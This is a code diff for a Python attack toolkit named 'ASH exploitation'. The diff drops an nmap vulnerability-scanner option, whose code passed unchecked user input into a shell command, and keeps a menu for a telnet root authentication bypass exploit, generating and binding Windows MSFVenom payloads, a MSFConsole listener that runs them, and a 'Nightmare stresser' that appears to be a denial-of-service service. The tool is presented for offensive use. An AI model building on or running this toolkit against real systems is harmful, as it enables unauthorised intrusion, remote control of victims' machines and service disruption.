@@ -64,11 +64,6 @@ def windowslistener():
     winpayload['LPORT'] = PORT
     exploit.execute(payload=winpayload)
 
-def vulnscanmodule():
-    target = input('[+] Target URL/IP Address: ')
-    subprocess.run(f'''nmap --script vuln --script-args mincvss+5.0 {target}''', shell=True)
-    print('\n[+] Happy hunting ;)')
-
 def nightmare():
     target = input('[+] Target URL/IP Address: ')
     port = input('[+] Target Port: ')
@@ -90,11 +85,10 @@ menu = Menu('''
  / ___ \ ___) |  _  |
 /_/   \_\____/|_| |_|
 
-\nAsh exploitation, at your service''')
+\nASH exploitation, at your service''')
 menu.add_option('[+] Exploit CVE-2026-2461 telnet root auth bypass', lambda: CVE20262461())
 menu.add_option('[+] Create windows payload (MSFVenom)', lambda: windowspayload())
 menu.add_option('[+] Bind windows payload (MSFVenom)', lambda: windowspayloadbind())
 menu.add_option('[+] Listen for windows payload (MSFConsole)', lambda: windowslistener())
-menu.add_option('[+] CVE scanner (NMAP)', lambda: vulnscanmodule())
 menu.add_option('[+] Nightmare stresser (Requires API key)', lambda: nightmare())
 menu.show()
